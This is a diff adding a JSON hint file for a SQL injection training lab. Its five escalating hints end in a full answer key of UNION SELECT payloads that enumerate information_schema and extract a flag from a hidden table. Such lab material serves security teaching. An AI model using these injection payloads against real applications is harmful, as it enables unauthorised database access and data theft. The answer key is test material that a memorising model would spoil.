@@ -1,0 +1,30 @@
+{
+  "labId": "sqli-02-union-products",
+  "hints": [
+    {
+      "level": 1,
+      "title": "Nudge",
+      "content": "The search field passes your input directly into a SQL query. Try injecting a single quote to see if you get an error or unexpected behavior."
+    },
+    {
+      "level": 2,
+      "title": "Direction",
+      "content": "The original query selects multiple columns. You need to figure out how many columns the query returns before you can use UNION SELECT. Try ORDER BY with increasing numbers."
+    },
+    {
+      "level": 3,
+      "title": "Approach",
+      "content": "First determine the column count with: ' ORDER BY 4-- (adjust number until error). Then use UNION SELECT 1,2,3,4 to see which columns are displayed. Finally, query information_schema.tables to find the hidden table."
+    },
+    {
+      "level": 4,
+      "title": "Near-solution",
+      "content": "The query has 4 columns. Use: ' UNION SELECT table_name,2,3,4 FROM information_schema.tables WHERE table_schema=database()-- to find tables. Look for a table that doesn't belong to the normal app. Then extract its columns and data."
+    },
+    {
+      "level": 5,
+      "title": "Solution",
+      "content": "1) Find column count: ' ORDER BY 4-- (works), ' ORDER BY 5-- (fails) = 4 columns. 2) Find tables: ' UNION SELECT table_name,2,3,4 FROM information_schema.tables WHERE table_schema=database()-- reveals 'secret_flags' table. 3) Find columns: ' UNION SELECT column_name,2,3,4 FROM information_schema.columns WHERE table_name='secret_flags'-- reveals 'flag_value'. 4) Extract flag: ' UNION SELECT flag_value,2,3,4 FROM secret_flags--"
+    }
+  ]
+}
